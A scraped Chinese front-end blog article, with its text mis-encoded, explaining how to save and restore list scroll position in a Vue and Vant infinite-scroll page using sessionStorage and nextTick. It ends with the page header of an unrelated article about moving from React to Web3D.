pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="an-old-hope">.hljs-comment,.hljs-quote{color:#b6b18b}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#eb3c54}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#e7ce56}.hljs-attribute{color:#ee7c2b}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#4fb4d7}.hljs-section,.hljs-title{color:#78bb65}.hljs-keyword,.hljs-selector-tag{color:#b45ea4}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#1c1d21;color:#c0c5ce}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨åšç§»åŠ¨ç«¯H5é¡¹ç›®æ—¶ï¼Œä½ ä¸€å®šé‡åˆ°è¿‡è¿™ç§ç³Ÿç³•çš„ä½“éªŒï¼š</p>
<blockquote>
<p>ä»ä¸€ä¸ªé•¿åˆ—è¡¨ç‚¹è¿›è¯¦æƒ…ï¼Œè¿”å›æ—¶åˆ—è¡¨åˆå›åˆ°äº†é¡¶éƒ¨ï¼Œç”¨æˆ·åªèƒ½ä¸€è¾¹é»˜é»˜åæ§½ä¸€è¾¹é‡æ–°å¾€ä¸‹æ»‘......</p>
</blockquote>
<p>æœ¬æ–‡ä»¥ä¸€ä¸ªå®é™…ä¸šåŠ¡é¡µé¢ä¸ºä¾‹ï¼Œå®Œæ•´æ‹†è§£ï¼š<strong>å¦‚ä½•åœ¨Vue+Vantçš„æ— é™æ»šåŠ¨åˆ—è¡¨ä¸­ï¼Œä¼˜é›…åœ°è®°å½•å’Œæ¢å¤æ»šåŠ¨ä½ç½®</strong>ï¼Œå®ç°çœŸæ­£ä¸æ»‘çš„è¿”å›ä½“éªŒã€‚</p>
<h3 data-id="heading-0">1.åœºæ™¯ä¸ç›®æ ‡</h3>
<p>é¡µé¢åŠŸèƒ½å¾ˆç®€å•ï¼š</p>
<ul>
<li>æ˜¾ç¤ºåˆ—è¡¨æ•°æ®ï¼ˆæ”¯æŒæœç´¢&amp;ä¸‹æ‹‰åŠ è½½æ›´å¤šï¼‰</li>
<li>ç‚¹å‡»åˆ—è¡¨é¡¹ï¼Œè·³è½¬åˆ°è¯¦æƒ…é¡µé¢</li>
<li>ä»è¯¦æƒ…é¡µè¿”å›åˆ—è¡¨åï¼Œ<strong>è¦åœç•™åœ¨ç¦»å¼€é¡µé¢æ—¶çš„ä½ç½®</strong>ï¼Œè€Œä¸æ˜¯é‡æ–°ä»é¡¶éƒ¨å¼€å§‹çœ‹</li>
</ul>
<p>ä½†çœŸæ­£å®ç°æ—¶ï¼Œé—®é¢˜å¹¶ä¸ç®€å•ï¼š</p>
<ol>
<li>åˆ—è¡¨æ˜¯æ— é™æ»šåŠ¨çš„ï¼ˆvan-liståˆ†é¡µåŠ è½½ï¼‰</li>
<li>è¿”å›æ—¶æ•°æ®éœ€è¦é‡æ–°åŠ è½½ï¼ˆä¸èƒ½ç®€å•ä¾èµ–æµè§ˆå™¨å†å²ç¼“å­˜ï¼‰</li>
<li>DOMæ›´æ–°æ˜¯å¼‚æ­¥çš„ï¼Œ<strong>æ•°æ®æ²¡åŠ è½½å¤Ÿæ—¶æ ¹æœ¬æ»šä¸åˆ°åŸæ¥çš„ä½ç½®</strong></li>
</ol>
<h3 data-id="heading-1">2.å®ç°æ€è·¯æ€»è§ˆ</h3>
<p>æ ¸å¿ƒæ€è·¯å¯ä»¥æ‹†æˆå››æ­¥ï¼š</p>
<ol>
<li><strong>æ»šåŠ¨å®¹å™¨å¼•ç”¨</strong>ï¼šé€šè¿‡Â <code>ref</code>Â æ‹¿åˆ°åˆ—è¡¨ DOMÂ å®¹å™¨</li>
<li><strong>æŒä¹…åŒ–æ»šåŠ¨ä½ç½®</strong>ï¼šç¦»å¼€å‰ç”¨Â <code>sessionStorage</code>Â è®°ä½Â <code>scrollTop</code></li>
<li><strong>å¸¦çŠ¶æ€åŠ è½½åˆ—è¡¨</strong>ï¼šè¿”å›åè¾¹åŠ è½½æ•°æ®è¾¹åˆ¤æ–­ã€Œé«˜åº¦æ˜¯å¦å¤Ÿæ»šåˆ°åŸä½ç½®ã€</li>
<li><strong>åœ¨åˆé€‚æ—¶æœºæ¢å¤æ»šåŠ¨</strong>ï¼šåˆ©ç”¨Â <code>nextTick</code>Â ç¡®ä¿ DOMÂ é«˜åº¦å°±ç»ªå†è®¾ç½®Â <code>scrollTop</code></li>
</ol>
<p>æ•´ä½“æµç¨‹å¯ä»¥ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼š</p>
<blockquote>
<p>ã€Œç¦»å¼€å‰å­˜ä½ç½®Â â†’Â å›æ¥å…ˆè¯»ä½ç½® â†’Â åˆ†é¡µåŠ è½½åˆ°è¶³å¤Ÿé«˜åº¦ â†’ å†ä¸€æ¬¡æ€§æŠŠæ»šåŠ¨æ¡æ‹‰å›å»ã€ã€‚</p>
</blockquote>
<p>ä¸‹é¢ç»“åˆå…·ä½“ä»£ç æ¥çœ‹ã€‚</p>
<h3 data-id="heading-2">3.å…³é”®çŠ¶æ€ï¼šæ»šåŠ¨ä½ç½®ä¸æ¢å¤æ ‡è®°</h3>
<p>é¦–å…ˆåœ¨Â <code>&lt;scriptÂ setup&gt;</code>Â ä¸­å®šä¹‰äº†å‡ ä¸ªä¸æ»šåŠ¨ç›¸å…³çš„çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> listAreaRef = ref&lt;<span class="hljs-title class_">HTMLElement</span> | <span class="hljs-literal">null</span>&gt;(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SCROLL_POSITION_KEY</span> = <span class="hljs-string">'teacher-list-scroll-position'</span>

<span class="hljs-comment">// ä¿å­˜çš„æ»šåŠ¨ä½ç½®</span>
<span class="hljs-keyword">const</span> savedPosition = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)

<span class="hljs-comment">// æ˜¯å¦æ­£åœ¨è¿›è¡Œæ»šåŠ¨æ¢å¤åŠ è½½</span>
<span class="hljs-keyword">const</span> isRestoringScroll = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">false</span>)
</code></pre>
<ul>
<li><code>listAreaRef</code>ï¼šç»‘å®šåˆ°åˆ—è¡¨åŒºåŸŸå®¹å™¨ DOMï¼ˆç”¨äºè¯»å–å’Œè®¾ç½®Â <code>scrollTop</code>ï¼‰</li>
<li><code>SCROLL_POSITION_KEY</code>ï¼šå­˜å‚¨åœ¨Â <code>sessionStorage</code>Â ä¸­çš„ key</li>
<li><code>savedPosition</code>ï¼šè®°å½•ä¹‹å‰æ»šåŠ¨åˆ°çš„å‚ç›´ä½ç½®</li>
<li><code>isRestoringScroll</code>ï¼šä¸€ä¸ªéå¸¸å…³é”®çš„æ ‡å¿—ï¼Œç”¨æ¥åŒºåˆ†ï¼š
<ul>
<li>æ™®é€šåˆ—è¡¨åŠ è½½</li>
<li>ä¸ºäº†æ¢å¤æ»šåŠ¨è€Œè§¦å‘çš„ã€Œè‡ªåŠ¨åŠ è½½æ›´å¤šã€</li>
</ul>
</li>
</ul>
<h3 data-id="heading-3">4.ç¦»å¼€å‰ï¼šå¦‚ä½•è®°å½•å½“å‰æ»šåŠ¨ä½ç½®ï¼Ÿ</h3>
<h4 data-id="heading-4">4.1 è·å–æ»šåŠ¨å®¹å™¨</h4>
<pre><code class="hljs language-ts" lang="ts">&lt;div ref=<span class="hljs-string">"listAreaRef"</span> <span class="hljs-keyword">class</span>=<span class="hljs-string">"list-area flex-1 overflow-auto"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">van-list</span>
    <span class="hljs-attr">v-if</span>=<span class="hljs-string">"list.length &gt; 0"</span>
    <span class="hljs-attr">v-model:loading</span>=<span class="hljs-string">"loading"</span>
    <span class="hljs-attr">:finished</span>=<span class="hljs-string">"finished"</span>
    <span class="hljs-attr">finished-text</span>=<span class="hljs-string">"æ²¡æœ‰æ›´å¤šäº†"</span>
    <span class="hljs-attr">:immediate-check</span>=<span class="hljs-string">"false"</span>
    @<span class="hljs-attr">load</span>=<span class="hljs-string">"getList"</span>
  &gt;</span>
    <span class="hljs-comment">&lt;!-- åˆ—è¡¨é¡¹... --&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">van-list</span>&gt;</span></span>
&lt;/div&gt;
</code></pre>
<p><code>ref="listAreaRef"</code>Â è®©æˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬é‡Œæ‹¿åˆ°çœŸæ­£æ»šåŠ¨çš„ DOMÂ å…ƒç´ ï¼Œè€Œä¸æ˜¯æ•´ä¸ªçª—å£ã€‚</p>
<h4 data-id="heading-5">4.2 ä¿å­˜æ»šåŠ¨ä½ç½®</h4>
<p>ä¿å­˜æ»šåŠ¨ä½ç½®çš„æ–¹æ³•éå¸¸ç›´æ¥ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">saveScrollPosition</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (listAreaRef.<span class="hljs-property">value</span>) {
    <span class="hljs-keyword">const</span> scrollTop = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span>
    sessionStorage.<span class="hljs-title function_">setItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>, scrollTop.<span class="hljs-title function_">toString</span>())
  }
}
</code></pre>
<p>è°ƒç”¨æ—¶æœºé€‰åœ¨<strong>ç¦»å¼€åˆ—è¡¨å‰</strong>ï¼Œä¾‹å¦‚ç‚¹å‡»åˆ—è¡¨é¡¹è·³è½¬åˆ°è¯¦æƒ…é¡µæ—¶ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">goToFaceUpload</span> = (<span class="hljs-params">teacher: ITeacherItem</span>) =&gt; {
  <span class="hljs-comment">// ä¿å­˜å½“å‰æ»šåŠ¨ä½ç½®</span>
  <span class="hljs-title function_">saveScrollPosition</span>()

  router.<span class="hljs-title function_">push</span>({...})
}
</code></pre>
<p>è¿™æ ·ï¼Œæ¯ä¸€æ¬¡ä»åˆ—è¡¨ç‚¹è¿›è¯¦æƒ…å‰ï¼Œå½“å‰çš„æ»šåŠ¨æ¡ä½ç½®éƒ½ä¼šè¢«å†™å…¥Â <code>sessionStorage</code>Â ä¸­ã€‚</p>
<h3 data-id="heading-6">5. è¿”å›åï¼šå¦‚ä½•åˆ¤æ–­ã€Œè¦ä¸è¦æ¢å¤ã€ï¼Ÿ</h3>
<p>åˆ—è¡¨é¡µé¢æŒ‚è½½æ—¶ï¼ˆ<code>onMounted</code>ï¼‰ï¼Œä¼šå°è¯•è¯»å–ä¹‹å‰ä¿å­˜çš„ä½ç½®ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> position = sessionStorage.<span class="hljs-title function_">getItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>)
  savedPosition.<span class="hljs-property">value</span> = position ? <span class="hljs-title class_">Number</span>(position) : <span class="hljs-number">0</span>

  <span class="hljs-comment">// å¦‚æœæœ‰ä¿å­˜çš„ä½ç½®,å¯åŠ¨æ»šåŠ¨æ¢å¤æµç¨‹</span>
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &gt; <span class="hljs-number">0</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
  }
  <span class="hljs-comment">// ...</span>
})
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªç»†èŠ‚ï¼š</p>
<ol>
<li><code>savedPosition.valueÂ &gt;Â 0</code>Â æ‰è®¤ä¸ºéœ€è¦æ¢å¤</li>
<li>ä¸€æ—¦éœ€è¦æ¢å¤ï¼Œå…ˆæŠŠÂ <code>isRestoringScroll</code>Â ç½®ä¸ºÂ <code>true</code>ï¼Œå†å¼€å§‹åŠ è½½åˆ—è¡¨æ•°æ®Â <code>getList()</code></li>
</ol>
<p>è¿™æ„å‘³ç€ï¼š<strong>é¡µé¢ä¸€è¿›æ¥ï¼Œå…ˆä¸ç€æ€¥æ¢å¤æ»šåŠ¨ï¼Œè€Œæ˜¯å…ˆæ ‡è®°ã€Œæˆ‘è¦æ¢å¤ã€ï¼Œç„¶åå¼€å§‹æŒ‰æ­£å¸¸æµç¨‹æ‹‰æ•°æ®</strong>ã€‚</p>
<h3 data-id="heading-7">6. åˆ†é¡µåŠ è½½ä¸­ï¼šå¦‚ä½•ã€ŒåŠ è½½åˆ°å¯ä»¥æ»šå›é‚£ä¸ªä½ç½®ã€ï¼Ÿ</h3>
<p>æ ¸å¿ƒé€»è¾‘åœ¨ä¸¤ä¸ªå‡½æ•°é‡Œï¼š</p>
<ul>
<li><code>getList</code>ï¼šçœŸæ­£çš„åˆ†é¡µæ¥å£è¯·æ±‚</li>
<li><code>checkAndLoadMoreForScroll</code>ï¼šåˆ¤æ–­ã€Œé«˜åº¦å¤Ÿä¸å¤Ÿã€è¦ä¸è¦ç»§ç»­æ‹‰æ•°æ®ã€</li>
</ul>
<h4 data-id="heading-8">6.1 æ¯æ¬¡åŠ è½½å®Œæ•°æ®åçš„å¤„ç†</h4>
<p><code>getList</code>Â åœ¨æˆåŠŸè·å–æ•°æ®ååšäº†è¿™äº›äº‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">getList</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// çœç•¥ loading &amp; æ¥å£è¯·æ±‚...</span>

    <span class="hljs-comment">// å¦‚æœæ­£åœ¨è¿›è¡Œæ»šåŠ¨æ¢å¤,ç»§ç»­æ£€æŸ¥</span>
    <span class="hljs-keyword">if</span> (isRestoringScroll.<span class="hljs-property">value</span>) {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">checkAndLoadMoreForScroll</span>()
    }

  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-comment">// é”™è¯¯å¤„ç†...</span>
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
  }
}
</code></pre>
<blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>åªè¦å½“å‰å¤„åœ¨ã€Œæ¢å¤æ¨¡å¼ã€ä¸‹ï¼Œæ¯æ‹‰å®Œä¸€æ¬¡æ•°æ®ï¼Œå°±æ£€æŸ¥ä¸€ä¸‹é«˜åº¦æ˜¯å¦å·²ç»è¶³å¤Ÿæ»šå›åŸä½ç½®ï¼›å¦‚æœä¸å¤Ÿï¼Œå°±ç»§ç»­æ‹‰ä¸‹ä¸€é¡µã€‚</strong></p>
</blockquote>
<h4 data-id="heading-9">6.2 é«˜åº¦æ˜¯å¦è¶³å¤Ÿï¼Ÿ<code>checkAndLoadMoreForScroll</code></h4>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAndLoadMoreForScroll</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰ä¿å­˜çš„ä½ç½®æˆ–å·²åŠ è½½å®Œæ‰€æœ‰æ•°æ®,ç»“æŸæ¢å¤æµç¨‹</span>
  <span class="hljs-keyword">if</span> (!savedPosition.<span class="hljs-property">value</span> || finished.<span class="hljs-property">value</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
    <span class="hljs-title function_">restoreScrollPosition</span>()
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-comment">// ç­‰å¾… DOM æ›´æ–°</span>
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()

  <span class="hljs-keyword">if</span> (!listAreaRef.<span class="hljs-property">value</span>) {
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-keyword">return</span>
  }

  <span class="hljs-keyword">const</span> scrollHeight = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollHeight</span>
  <span class="hljs-keyword">const</span> clientHeight = listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">clientHeight</span>
  <span class="hljs-keyword">const</span> maxScrollTop = scrollHeight - clientHeight

  <span class="hljs-comment">// å¦‚æœå½“å‰åˆ—è¡¨é«˜åº¦ä¸è¶³ä»¥æ»šåŠ¨åˆ°ä¿å­˜çš„ä½ç½®,ç»§ç»­åŠ è½½</span>
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &gt; maxScrollTop &amp;&amp; !finished.<span class="hljs-property">value</span>) {
    loading.<span class="hljs-property">value</span> = <span class="hljs-literal">true</span>
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">getList</span>()
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// é«˜åº¦è¶³å¤Ÿ,æ¢å¤æ»šåŠ¨ä½ç½®</span>
    isRestoringScroll.<span class="hljs-property">value</span> = <span class="hljs-literal">false</span>
    <span class="hljs-title function_">restoreScrollPosition</span>()
  }
}
</code></pre>
<p>è¿™é‡Œæœ‰å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<ol>
<li>
<p><strong>ç­‰å¾… DOM æ›´æ–°</strong>ï¼šæ¯æ¬¡æ•°æ®è¿›æ¥åï¼Œå…ˆÂ <code>awaitÂ nextTick()</code>ï¼Œç¡®ä¿Â <code>scrollHeight</code>Â æ˜¯æœ€æ–°çš„</p>
</li>
<li>
<p><strong>åˆ¤æ–­æœ€å¤§å¯æ»šåŠ¨é«˜åº¦</strong>ï¼š</p>
<ul>
<li><code>scrollHeight</code>ï¼šå†…å®¹æ€»é«˜åº¦</li>
<li><code>clientHeight</code>ï¼šå¯è§†åŒºåŸŸé«˜åº¦</li>
<li><code>maxScrollTopÂ =Â scrollHeightÂ -Â clientHeight</code></li>
</ul>
</li>
<li>
<p><strong>æ¯”è¾ƒä¿å­˜ä½ç½®ä¸æœ€å¤§é«˜åº¦</strong>ï¼š</p>
<ul>
<li>å¦‚æœÂ <code>savedPositionÂ &gt; maxScrollTop</code>ï¼šè¯´æ˜å½“å‰å†…å®¹è¿˜ä¸å¤Ÿé•¿ï¼Œæ»šåŠ¨æ¡æœ€å¤šåªèƒ½åˆ°Â <code>maxScrollTop</code>ï¼Œè¿˜è¾¾ä¸åˆ°ä¹‹å‰çš„ä½ç½®Â â†’Â å†æ‹‰ä¸€é¡µæ•°æ®</li>
<li>å¦åˆ™ï¼šè¯´æ˜å½“å‰å†…å®¹é«˜åº¦å·²ç»è¶³å¤ŸÂ â†’ å¯ä»¥å®‰å…¨æ¢å¤åˆ°Â <code>savedPosition</code></li>
</ul>
<p>è¿™å°±å®Œç¾è§£å†³äº†ä¸€ä¸ªå¸¸è¢«å¿½è§†çš„é—®é¢˜ï¼š</p>
</li>
</ol>
<blockquote>
<p><strong>ä¸è¦åœ¨å†…å®¹è¿˜ä¸å¤Ÿé«˜çš„æ—¶å€™å°±æ€¥ç€è®¾ç½® scrollTop</strong>ï¼Œå¦åˆ™æ¢å¤ä½ç½®ä¼šå¤±è´¥æˆ–ä¸å‡†ç¡®ã€‚</p>
</blockquote>
<h3 data-id="heading-10">7. æ¢å¤æ»šåŠ¨ï¼šè°¨æ…åœ°è®¾ç½®<code>scrollTop</code></h3>
<p>æœ€ç»ˆçœŸæ­£æ“ä½œæ»šåŠ¨æ¡çš„æ˜¯Â <code>restoreScrollPosition</code>ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">restoreScrollPosition</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (savedPosition.<span class="hljs-property">value</span> &amp;&amp; listAreaRef.<span class="hljs-property">value</span>) {
    <span class="hljs-title function_">nextTick</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">if</span> (listAreaRef.<span class="hljs-property">value</span>) {
        listAreaRef.<span class="hljs-property">value</span>.<span class="hljs-property">scrollTop</span> = savedPosition.<span class="hljs-property">value</span>
      }
    })
  }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡ŒåˆåŒ…äº†ä¸€å±‚Â <code>nextTick()</code>ï¼š</p>
<ul>
<li><code>checkAndLoadMoreForScroll</code>Â é‡Œå·²ç»Â <code>awaitÂ nextTick()</code>Â äº†ä¸€æ¬¡</li>
<li>åœ¨çœŸæ­£è®¾ç½®Â <code>scrollTop</code>Â æ—¶ï¼Œå†å¥—ä¸€å±‚Â <code>nextTick</code></li>
</ul>
<p>è¿™ç§ã€ŒåŒå±‚ nextTickã€è™½ç„¶çœ‹èµ·æ¥æœ‰ç‚¹å•°å—¦ï¼Œä½†åœ¨å¤æ‚åœºæ™¯ï¼ˆæ¯”å¦‚æœ‰å›¾ç‰‡åŠ è½½ã€ç»„ä»¶å†…éƒ¨è¿˜åœ¨åšæ¸²æŸ“ï¼‰çš„æƒ…å†µä¸‹ï¼Œèƒ½è¿›ä¸€æ­¥æé«˜æˆåŠŸæ¢å¤çš„å¯é æ€§ã€‚</p>
<h3 data-id="heading-11">8. ä½•æ—¶æ¸…é™¤ä¿å­˜çš„æ»šåŠ¨ä½ç½®ï¼Ÿ</h3>
<p>è€ƒè™‘äº†ã€Œç”¨æˆ·ä¸»åŠ¨è¿”å›ä¸Šä¸€é¡µã€è¿™ç§åœºæ™¯ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleBack</span> = (<span class="hljs-params"/>) =&gt; {
  sessionStorage.<span class="hljs-title function_">removeItem</span>(<span class="hljs-variable constant_">SCROLL_POSITION_KEY</span>)
}
</code></pre>
<ul>
<li>ä»åˆ—è¡¨<strong>è¿”å›æ›´ä¸Šçº§é¡µé¢</strong>æ—¶ï¼Œä¸éœ€è¦å†ä¿ç•™è¿™æ®µæ»šåŠ¨çŠ¶æ€</li>
<li>å†æ¬¡è¿›å…¥åˆ—è¡¨æ—¶å°±æ˜¯ä¸€æ¬¡å…¨æ–°çš„æµè§ˆ</li>
</ul>
<p>ä¸šåŠ¡ä¸Šçš„è¡Œä¸ºè¾¹ç•Œä¹Ÿè¢«æ¸…æ™°åœ°åŒºåˆ†äº†å‡ºæ¥ã€‚</p>
<h3 data-id="heading-12">9. å†™åœ¨æœ€å</h3>
<p>å¦‚æœä½ é¡¹ç›®é‡Œä¹Ÿæœ‰ã€Œå¸¦æœç´¢Â +Â åˆ†é¡µåŠ è½½Â +Â è·³è¯¦æƒ…ã€çš„é•¿åˆ—è¡¨ï¼Œè¿™ç§æ–¹å¼å¯ä»¥æ— ç—›æå‡ç”¨æˆ·ä½“éªŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[github star åŠ æ˜Ÿå¤šçš„ä» React åˆ° Web3Dï¼šå‰ç«¯å¼€å‘è€…çš„ä¸‰ç»´ä¸–ç•Œå…¥é—¨æŒ‡å—]]></title>    <link>https://juejin.cn/post/7592944032772915251</link>    <guid>https://juejin.cn/post/7592944032772915251</guid>    <pubDate>2026-01-09T03:25:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592944032772915251" data-draft-id="7592992745573171238" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="github star åŠ æ˜Ÿå¤šçš„ä» React åˆ° Web3Dï¼šå‰ç«¯å¼€å‘è€…çš„ä¸‰ç»´ä¸–ç•Œå…¥é—¨æŒ‡å—"/> <meta itemprop="keywords" content="JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-09T03:25:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¼€æºä¹‹çœ¼"/> <meta itemprop="url" content="https://juejin.cn/user/55438993800919"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            github star åŠ æ˜Ÿå¤šçš„ä» React åˆ° Web3Dï¼šå‰ç«¯å¼€å‘è€…çš„ä¸‰ç»´ä¸–ç•Œå…¥é—¨æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/55438993800919/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¼€æºä¹‹çœ¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:25:40.000Z" title="Fri Jan 09 2026 03:25:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body 